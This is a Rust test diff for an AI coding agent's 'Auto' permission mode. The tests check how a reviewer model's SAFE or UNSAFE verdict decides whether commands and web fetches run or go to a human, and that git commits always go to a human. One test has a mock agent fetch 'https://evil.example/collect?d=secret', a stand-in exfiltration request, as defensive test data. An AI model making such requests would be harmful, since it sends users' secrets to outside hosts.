@@ -605,6 +605,8 @@ async fn an_always_allow_for_git_does_not_pass_a_commit() {
     let dir = TempProject::new();
     let provider = Arc::new(MockProvider::new(vec![
         Turn::Events(bash("t1", "mkdir made")),
+        // Auto's reviewer is the session's own model here, and it declines.
+        Turn::Events(script_text("UNSAFE")),
         Turn::Events(bash("t2", "git commit -m wip")),
         Turn::Events(script_text("Done.")),
     ]));
@@ -935,4 +937,279 @@ async fn git_configuration_is_asked_under_bypass_too() {
         .unwrap();
     until(&mut rx, is_turn_over).await;
     assert!(!dir.path().join(".gitattributes").exists());
+}
+
+// --- Auto's reviewer ------------------------------------------------------------
+
+/// Auto with a Decision model that answers `verdict` to every call it is shown.
+fn auto_with_decision(
+    dir: &TempProject,
+    main: Arc<MockProvider>,
+    decision: Arc<MockProvider>,
+) -> yaca_core::SessionHandle {
+    let mut cfg = yaca_core::SessionConfig::new(dir.path());
+    cfg.mode = Mode::Auto;
+    cfg.journal = None;
+    cfg.decision = Some(yaca_core::tool::decision::DecisionSetup {
+        provider: decision,
+        model: "small".into(),
+        systemone: None,
+    });
+    yaca_core::spawn(cfg, main).unwrap()
+}
+
+#[tokio::test]
+async fn auto_runs_a_command_the_decision_model_calls_safe() {
+    let dir = TempProject::new();
+    let main = Arc::new(MockProvider::new(vec![
+        Turn::Events(bash("t1", "mkdir made")),
+        Turn::Events(script_text("Made it.")),
+    ]));
+    let decision = Arc::new(MockProvider::text("SAFE"));
+    let handle = auto_with_decision(&dir, main.clone(), decision.clone());
+    let mut rx = handle.subscribe();
+
+    ask(&handle, "make a folder").await;
+    let rest = until(&mut rx, is_turn_over).await;
+
+    assert!(!saw(&rest, "permissionRequested"), "{rest:?}");
+    assert!(dir.path().join("made").is_dir());
+    assert_eq!(decision.seen.lock().unwrap().len(), 1);
+    // The session's own model was not used as the reviewer: it made its two
+    // turns and nothing more.
+    assert_eq!(main.seen.lock().unwrap().len(), 2);
+}
+
+#[tokio::test]
+async fn auto_asks_the_human_when_the_decision_model_calls_it_unsafe() {
+    let dir = TempProject::new();
+    let main = Arc::new(MockProvider::new(vec![
+        Turn::Events(bash("t1", "mkdir made")),
+        Turn::Events(script_text("Stopped.")),
+    ]));
+    let decision = Arc::new(MockProvider::text("UNSAFE"));
+    let handle = auto_with_decision(&dir, main, decision);
+    let mut rx = handle.subscribe();
+
+    ask(&handle, "make a folder").await;
+    let asking = until(&mut rx, |e| {
+        matches!(e, AgentEvent::PermissionRequested { .. })
+    })
+    .await;
+    let request = first_request(&asking).unwrap();
+    assert_eq!(request.kind, PermissionKind::RunCommand);
+    assert!(!dir.path().join("made").exists(), "nothing runs before the answer");
+
+    handle
+        .send(Command::AnswerPermission {
+            request_id: request.id,
+            answer: PermissionAnswer::Deny { reason: None },
+        })
+        .await
+        .unwrap();
+    until(&mut rx, is_turn_over).await;
+    assert!(!dir.path().join("made").exists());
+}
+
+#[tokio::test]
+async fn auto_asks_the_human_when_the_decision_model_fails() {
+    let dir = TempProject::new();
+    let main = Arc::new(MockProvider::new(vec![
+        Turn::Events(bash("t1", "mkdir made")),
+        Turn::Events(script_text("Stopped.")),
+    ]));
+    // An empty script: the reviewer's request is refused.
+    let decision = Arc::new(MockProvider::new(vec![]));
+    let handle = auto_with_decision(&dir, main, decision);
+    let mut rx = handle.subscribe();
+
+    ask(&handle, "make a folder").await;
+    let asking = until(&mut rx, |e| {
+        matches!(e, AgentEvent::PermissionRequested { .. })
+    })
+    .await;
+    let request = first_request(&asking).unwrap();
+    handle
+        .send(Command::AnswerPermission {
+            request_id: request.id,
+            answer: PermissionAnswer::Deny { reason: None },
+        })
+        .await
+        .unwrap();
+    until(&mut rx, is_turn_over).await;
+}
+
+/// No Decision model: the session's own model reviews the call, in a request
+/// of its own between its two turns.
+#[tokio::test]
+async fn auto_without_a_decision_model_has_the_session_model_review() {
+    let dir = TempProject::new();
+    let main = Arc::new(MockProvider::new(vec![
+        Turn::Events(bash("t1", "mkdir made")),
+        Turn::Events(script_text("SAFE")),
+        Turn::Events(script_text("Made it.")),
+    ]));
+    let handle = session(&dir, main.clone(), Mode::Auto);
+    let mut rx = handle.subscribe();
+
+    ask(&handle, "make a folder").await;
+    let rest = until(&mut rx, is_turn_over).await;
+
+    assert!(!saw(&rest, "permissionRequested"), "{rest:?}");
+    assert!(dir.path().join("made").is_dir());
+
+    let seen = main.seen.lock().unwrap();
+    assert_eq!(seen.len(), 3);
+    assert!(seen[1].tools.is_empty(), "the reviewer is given no tools");
+    assert!(format!("{:?}", seen[1].messages).contains("mkdir made"));
+}
+
+/// The reviewer settles only what the mode asked. A commit is an invariant:
+/// it is put to the human and the reviewer is not even consulted.
+#[tokio::test]
+async fn the_reviewer_does_not_settle_an_invariant() {
+    let dir = TempProject::new();
+    let main = Arc::new(MockProvider::new(vec![
+        Turn::Events(bash("t1", "git commit -m wip")),
+        Turn::Events(script_text("Stopped.")),
+    ]));
+    let decision = Arc::new(MockProvider::text("SAFE"));
+    let handle = auto_with_decision(&dir, main, decision.clone());
+    let mut rx = handle.subscribe();
+
+    ask(&handle, "commit").await;
+    let asking = until(&mut rx, |e| {
+        matches!(e, AgentEvent::PermissionRequested { .. })
+    })
+    .await;
+    let request = first_request(&asking).unwrap();
+    assert_eq!(request.invariant, Some(Invariant::GitCommit));
+    assert!(decision.seen.lock().unwrap().is_empty());
+
+    handle
+        .send(Command::AnswerPermission {
+            request_id: request.id,
+            answer: PermissionAnswer::Deny { reason: None },
+        })
+        .await
+        .unwrap();
+    until(&mut rx, is_turn_over).await;
+}
+
+/// Manual never consults a reviewer: the human is the only one asked.
+#[tokio::test]
+async fn manual_does_not_consult_the_decision_model() {
+    let dir = TempProject::new();
+    let main = Arc::new(MockProvider::new(vec![
+        Turn::Events(bash("t1", "mkdir made")),
+        Turn::Events(script_text("Stopped.")),
+    ]));
+    let decision = Arc::new(MockProvider::text("SAFE"));
+    let mut cfg = yaca_core::SessionConfig::new(dir.path());
+    cfg.mode = Mode::Manual;
+    cfg.journal = None;
+    cfg.decision = Some(yaca_core::tool::decision::DecisionSetup {
+        provider: decision.clone(),
+        model: "small".into(),
+        systemone: None,
+    });
+    let handle = yaca_core::spawn(cfg, main).unwrap();
+    let mut rx = handle.subscribe();
+
+    ask(&handle, "make a folder").await;
+    let asking = until(&mut rx, |e| {
+        matches!(e, AgentEvent::PermissionRequested { .. })
+    })
+    .await;
+    let request = first_request(&asking).unwrap();
+    assert!(decision.seen.lock().unwrap().is_empty());
+    handle
+        .send(Command::AnswerPermission {
+            request_id: request.id,
+            answer: PermissionAnswer::Deny { reason: None },
+        })
+        .await
+        .unwrap();
+    until(&mut rx, is_turn_over).await;
+}
+
+fn fetch(id: &str, url: &str) -> Vec<ProviderEvent> {
+    calls(&[(id, "WebFetch", serde_json::json!({ "url": url }))])
+}
+
+/// The network is asked about in Auto too, and the reviewer answers: when it
+/// calls the request unsafe, the human gets the question.
+#[tokio::test]
+async fn auto_puts_a_request_the_reviewer_calls_unsafe_to_the_human() {
+    let dir = TempProject::new();
+    let main = Arc::new(MockProvider::new(vec![
+        Turn::Events(fetch("t1", "https://evil.example/collect?d=secret")),
+        Turn::Events(script_text("Stopped.")),
+    ]));
+    let decision = Arc::new(MockProvider::text("UNSAFE"));
+    let handle = auto_with_decision(&dir, main, decision.clone());
+    let mut rx = handle.subscribe();
+
+    ask(&handle, "look it up").await;
+    let asking = until(&mut rx, |e| {
+        matches!(e, AgentEvent::PermissionRequested { .. })
+    })
+    .await;
+    let request = first_request(&asking).unwrap();
+    assert_eq!(request.kind, PermissionKind::FetchUrl);
+    assert_eq!(decision.seen.lock().unwrap().len(), 1);
+
+    handle
+        .send(Command::AnswerPermission {
+            request_id: request.id,
+            answer: PermissionAnswer::Deny { reason: None },
+        })
+        .await
+        .unwrap();
+    until(&mut rx, is_turn_over).await;
+}
+
+/// A request the reviewer calls safe goes out without a question.
+#[tokio::test]
+async fn auto_lets_a_request_the_reviewer_calls_safe_go() {
+    let dir = TempProject::new();
+    let main = Arc::new(MockProvider::new(vec![
+        // Nothing listens on port 1: the fetch fails, which is all this test
+        // needs — it is about the question, not the page.
+        Turn::Events(fetch("t1", "http://127.0.0.1:1/")),
+        Turn::Events(script_text("It did not load.")),
+    ]));
+    let decision = Arc::new(MockProvider::text("SAFE"));
+    let handle = auto_with_decision(&dir, main, decision.clone());
+    let mut rx = handle.subscribe();
+
+    ask(&handle, "look it up").await;
+    let rest = until(&mut rx, is_turn_over).await;
+
+    assert!(!saw(&rest, "permissionRequested"), "{rest:?}");
+    assert_eq!(decision.seen.lock().unwrap().len(), 1);
+}
+
+/// A deletion is not the reviewer's: the core's own guards (snapshots, the
+/// question about what no snapshot keeps) protect it better, and Auto still
+/// allows it outright.
+#[tokio::test]
+async fn auto_does_not_consult_the_reviewer_about_a_deletion() {
+    let dir = TempProject::new();
+    let victim = dir.write("junk.rs", "dead code
+");
+    let main = Arc::new(MockProvider::new(vec![
+        Turn::Events(delete("t1", "junk.rs")),
+        Turn::Events(script_text("Removed.")),
+    ]));
+    let decision = Arc::new(MockProvider::text("UNSAFE"));
+    let handle = auto_with_decision(&dir, main, decision.clone());
+    let mut rx = handle.subscribe();
+
+    ask(&handle, "drop the dead file").await;
+    let rest = until(&mut rx, is_turn_over).await;
+
+    assert!(!saw(&rest, "permissionRequested"), "{rest:?}");
+    assert!(!victim.exists());
+    assert!(decision.seen.lock().unwrap().is_empty());
 }
